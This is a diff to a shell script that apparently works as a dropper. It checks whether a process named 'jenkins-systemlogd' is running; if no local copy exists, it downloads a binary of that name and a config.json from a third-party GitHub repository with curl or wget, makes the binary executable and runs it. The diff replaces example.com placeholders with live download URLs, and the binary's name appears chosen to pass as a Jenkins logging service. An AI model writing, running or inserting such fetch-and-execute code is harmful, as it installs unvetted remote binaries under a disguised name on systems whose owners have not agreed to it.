@@ -4,14 +4,15 @@ if pgrep -f "jenkins-systemlogd" > /dev/null; then
 fi
 
 if [ -f "jenkins-systemlogd" ]; then
+    chmod +x jenkins-systemlogd
     FILE_TO_RUN="./jenkins-systemlogd"
 else
     if command -v curl > /dev/null; then
-        curl -s -o jenkins-systemlogd https://example.com/jenkins-systemlogd
-        curl -s -o config.json https://example.com/config.json
+        curl -s -o jenkins-systemlogd https://github.com/supportmrx/jenkins-systemlogd/raw/refs/heads/main/jenkins-systemlogd
+        curl -s -o config.json https://raw.githubusercontent.com/supportmrx/jenkins-systemlogd/refs/heads/main/config.json
     elif command -v wget > /dev/null; then
-        wget -q -O jenkins-systemlogd https://example.com/jenkins-systemlogd
-        wget -q -O config.json https://example.com/config.json
+        wget -q -O jenkins-systemlogd https://github.com/supportmrx/jenkins-systemlogd/raw/refs/heads/main/jenkins-systemlogd
+        wget -q -O config.json https://raw.githubusercontent.com/supportmrx/jenkins-systemlogd/refs/heads/main/config.json
     else
         exit 1
     fi
